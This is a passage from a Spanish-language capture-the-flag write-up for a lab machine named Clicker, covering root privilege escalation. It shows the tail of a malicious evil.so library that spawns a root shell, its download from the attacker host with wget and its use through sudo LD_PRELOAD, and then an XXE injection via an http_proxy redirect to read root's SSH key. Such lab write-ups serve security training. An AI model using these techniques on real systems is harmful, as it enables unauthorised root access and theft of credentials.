</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">setuid</span>(<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">setgid</span>(<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;/bin/bash -p&#34;</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>La compilamos&hellip;</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ gcc -fPIC -shared -nostartfiles -o evil.so evil.c
</span></span><span style="display:flex;"><span>evil.c: In <span style="color:#66d9ef">function</span> ‘_init’:
</span></span><span style="display:flex;"><span>evil.c:7:9: warning: implicit declaration of <span style="color:#66d9ef">function</span> ‘setuid’ <span style="color:#f92672">[</span>-Wimplicit-function-declaration<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">7</span> |         setuid<span style="color:#f92672">(</span>0<span style="color:#f92672">)</span>;
</span></span><span style="display:flex;"><span>      |         ^~~~~~
</span></span><span style="display:flex;"><span>evil.c:8:9: warning: implicit declaration of <span style="color:#66d9ef">function</span> ‘setgid’ <span style="color:#f92672">[</span>-Wimplicit-function-declaration<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">8</span> |         setgid<span style="color:#f92672">(</span>0<span style="color:#f92672">)</span>;
</span></span><span style="display:flex;"><span>      |         ^~~~~~
</span></span><span style="display:flex;"><span>┌─<span style="color:#f92672">[</span>192.168.1.52<span style="color:#f92672">]</span>─<span style="color:#f92672">[</span>pointedsec@parrot<span style="color:#f92672">]</span>─<span style="color:#f92672">[</span>~/Desktop/clicker/content<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└──╼ <span style="color:#f92672">[</span>★<span style="color:#f92672">]</span>$ ls -la evil.so
</span></span><span style="display:flex;"><span>-rwxr-xr-x <span style="color:#ae81ff">1</span> pointedsec pointedsec <span style="color:#ae81ff">14152</span> ago <span style="color:#ae81ff">13</span> 22:19 evil.so
</span></span></code></pre></div><p>Nos la pasamos a la máquina víctima</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>jack@clicker:/tmp$ wget http://10.10.14.85:8081/evil.so
</span></span><span style="display:flex;"><span>--2024-08-13 18:20:20--  http://10.10.14.85:8081/evil.so
</span></span><span style="display:flex;"><span>Connecting to 10.10.14.85:8081... connected.
</span></span><span style="display:flex;"><span>HTTP request sent, awaiting response... <span style="color:#ae81ff">200</span> OK
</span></span><span style="display:flex;"><span>Length: <span style="color:#ae81ff">14152</span> <span style="color:#f92672">(</span>14K<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>application/octet-stream<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>Saving to: ‘evil.so’
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>evil.so                100%<span style="color:#f92672">[==========================</span>&gt;<span style="color:#f92672">]</span>  13.82K  --.-KB/s    in 0.04s   
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>2024-08-13 18:20:20 <span style="color:#f92672">(</span><span style="color:#ae81ff">371</span> KB/s<span style="color:#f92672">)</span> - ‘evil.so’ saved <span style="color:#f92672">[</span>14152/14152<span style="color:#f92672">]</span>
</span></span></code></pre></div><p>Y ahora si cargamos nuestra librería compartida maliciosa en memoria del programa
estableciendo la variable d entorno <code>LD_PRELOAD</code>&hellip;</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>jack@clicker:/tmp$ sudo LD_PRELOAD<span style="color:#f92672">=</span>/tmp/evil.so /opt/monitor.sh
</span></span><span style="display:flex;"><span>root@clicker:/tmp# id
</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span>
</span></span></code></pre></div><p>Y podríamos leer la flag</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>root@clicker:/tmp# cat /root/root.txt
</span></span><span style="display:flex;"><span>afbf7c61dbdb7fa331...
</span></span></code></pre></div><h1 id="privilege-escalation---the-intented-path">Privilege Escalation -&gt; The intented path</h1>
<p>El camino que había que tomar para completar esta máquina no era el que hemos tomado en este write-up.</p>
<p>Si no que como se está utilizando <code>curl</code> podemos establecer la variable de entorno <code>http_proxy</code> aprovechándonos del <code>SETENV</code> para poder modificar los datos que se envían al recurso <code>diagnostic.php</code> y de esta manera poder forzar un XML External Entity Injection (XXE) y de esta forma leer la <code>id_rsa</code> de <code>root</code> y conectarnos por SSH como <code>root</code></p>
<p>Podemos empaparos un poco de la documentación sobre esta variable de entorno.
<a href="https://everything.curl.dev/usingcurl/proxies/env.html">https://everything.curl.dev/usingcurl/proxies/env.html</a></p>
<p>Así que primero, en <code>burpsuite</code> vamos a editar nuestro proxy y establecer que esté en escucha por todas las interfaces.
<img src="images/Screenshot_33.png" alt="Write-up Image"></p>
<p>Y ahora si nos ponemos a interceptar las solicitudes y ejecutamos el script estableciendo la variable de entorno <code>http_proxy</code> a nuestro proxy de la máquina atacante.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>jack@clicker:/tmp$ sudo http_proxy<span style="color:#f92672">=</span>http://10.10.14.85:8080 /opt/monitor.sh
</span></span></code></pre></div><p>Nos llega la petición y podemos modificarla.
<img src="images/Screenshot_34.png" alt="Write-up Image"></p>
<p>Hay que entender también lo que está pasando pro detrás, y es que el script primero hace una solicitud a <code>diagnostic.php</code> cuya respuesta no podemos controlar, pero eso nos da igual, lo que nos importa es poder modificar la respuesta que recibe el cliente, no la que nos ofrece el recurso <code>diagnostic.php</code></p>
<p>Ya que esta respuesta se pasa a la utilidad <code>/usr/bin/xml_pp</code> que es donde podemos hacer que se acontezca el XXE.</p>
<p>Por lo cual, al interceptar la petición interceptamos también la respuesta&hellip;
<img src="images/Screenshot_35.png" alt="Write-up Image"></p>
<p>Y aquí vamos a inyectar el XXE
<img src="images/Screenshot_36.png" alt="Write-up Image"></p>
<p><img src="images/Screenshot_37.png" alt="Write-up Image"></p>
<p>Y si le damos a <code>Forward</code>&hellip;
Vemos que se carga el <code>/etc/passwd</code>
<img src="images/Screenshot_38.png" alt="Write-up Image"></p>
<p>Como la data se está pasando a la utilidad <code>xml_pp</code> como <code>root</code>, podemos hacer que el XXE cargue la clave privada de <code>root</code> para intentar iniciar sesión por SSH.</p>
<p>Por lo cual repetimos el proceso pero modificamos el XXE.
<img src="images/Screenshot_39.png" alt="Write-up Image"></p>
<p>Y obtenemos la clave privada de <code>root</code>.
<img src="images/Screenshot_40.png" alt="Write-up Image"></p>
<p>Y ya podemos conectarnos como <code>root</code> utilizando su clave privada.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>jack@clicker:/tmp$ nano id_rsa
</span></span><span style="display:flex;"><span>jack@clicker:/tmp$ chmod <span style="color:#ae81ff">600</span> id_rsa 
</span></span><span style="display:flex;"><span>jack@clicker:/tmp$ ssh -i id_rsa root@127.0.0.1
</span></span><span style="display:flex;"><span>....
</span></span><span style="display:flex;"><span>root@clicker:~# id
</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span>
</span></span></code></pre></div><p>Y ahora sí, ¡ya estaría!</p>
<p>Happy Hacking! 🚀</p>

    </div>

    

            </div>
        </div><footer class="text-center pb-1">
    <small class="text-muted">
        
            &copy; 2024, Andrés Del Cerro
        
        <br>
        Powered by <a href="https://gohugo.io/" target="_blank">Hugo</a>
        and <a href="https://github.com/austingebauer/devise" target="_blank">Devise</a>
    </small>
</footer>
</body>
</html>
